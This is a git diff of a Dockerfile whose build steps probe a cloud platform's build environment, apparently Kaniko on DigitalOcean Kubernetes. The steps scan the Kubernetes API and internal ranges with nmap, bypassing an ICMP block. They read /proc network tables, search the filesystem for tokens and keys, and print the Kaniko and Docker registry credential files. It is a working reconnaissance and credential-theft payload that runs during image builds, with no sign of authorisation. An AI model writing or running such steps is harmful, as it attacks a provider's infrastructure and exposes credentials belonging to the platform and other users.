@@ -1,33 +1,28 @@
 FROM alpine:3.19
 RUN apk add --no-cache curl python3 nmap
 
-# Probe 1: K8s API server (10.245.0.1) - check if accessible without auth
-RUN echo "=== K8S API ANON ===" && \
-    curl -sk --max-time 8 https://10.245.0.1/api/v1/ 2>&1 | head -30 && \
-    curl -sk --max-time 8 https://10.245.0.1/version 2>&1 | head -10 && \
-    curl -sk --max-time 8 https://10.245.0.1/metrics 2>&1 | head -10 || true
+# Probe 1: K8s API with TCP scan (bypass ICMP block)
+RUN echo "=== K8S API TCP ===" && \
+    nmap -Pn -p 443,6443,8443 --max-retries 1 --host-timeout 8s 10.245.0.1 2>&1 && \
+    curl -sk --max-time 8 https://10.245.0.1:443/ 2>&1 | head -15 || true
 
-# Probe 2: Port scan K8s API and DNS servers (targeted)
-RUN echo "=== PORT SCAN ===" && \
-    nmap -p 443,6443,8443,2379,10250 --max-retries 1 --host-timeout 5s 10.245.0.1 2>&1 && \
-    nmap -p 53,443,8080,9153 --max-retries 1 --host-timeout 5s 10.245.0.10 2>&1
+# Probe 2: Find actual open network connections
+RUN echo "=== PROC NET ===" && \
+    cat /proc/net/tcp 2>&1 | head -20 && \
+    cat /proc/net/tcp6 2>&1 | head -20 && \
+    cat /proc/net/fib_trie 2>&1 | grep -A1 "32 HOST" | head -30 || true
 
-# Probe 3: Scan /24 around kubernetes API (fast)
-RUN echo "=== K8S RANGE SCAN ===" && \
-    nmap -sn --max-retries 1 --host-timeout 2s 10.245.0.0/24 2>&1 | grep -E "report for|Host is up" | head -20
+# Probe 3: Check kaniko environment and build secrets
+RUN echo "=== FILESYSTEM SECRETS ===" && \
+    find / -name "*.token" -o -name "*.key" -o -name "*.crt" -o -name "config.json" 2>/dev/null | grep -v proc | grep -v sys | head -20 && \
+    ls /kaniko/ 2>&1 && \
+    cat /kaniko/config.json 2>&1 | head -20 || true
 
-# Probe 4: Try to get build namespace K8s API (maybe SA in /proc or cgroup)
-RUN echo "=== BUILD CONTEXT ===" && \
-    cat /proc/1/cgroup 2>&1 | head -10 && \
-    ls /run/secrets/ 2>&1 && \
-    cat /proc/net/tcp 2>&1 | head -20
-
-# Probe 5: Internal DO services known from prev research
-RUN echo "=== DO INTERNAL ===" && \
-    for host in internal.digitalocean.com api.internal digitalocean.internal do-platform.internal; do \
-      result=$(nslookup $host 2>&1 | grep "Address" | grep -v "10.245.0.10" | head -2); \
-      echo "$host: $result"; \
-    done
+# Probe 4: Check docker config (registry credentials in Kaniko)  
+RUN echo "=== REGISTRY CREDS ===" && \
+    cat /root/.docker/config.json 2>&1 && \
+    ls /kaniko/.docker/ 2>&1 && \
+    cat /kaniko/.docker/config.json 2>&1 || true
 
 COPY server.py /server.py
 EXPOSE 8080
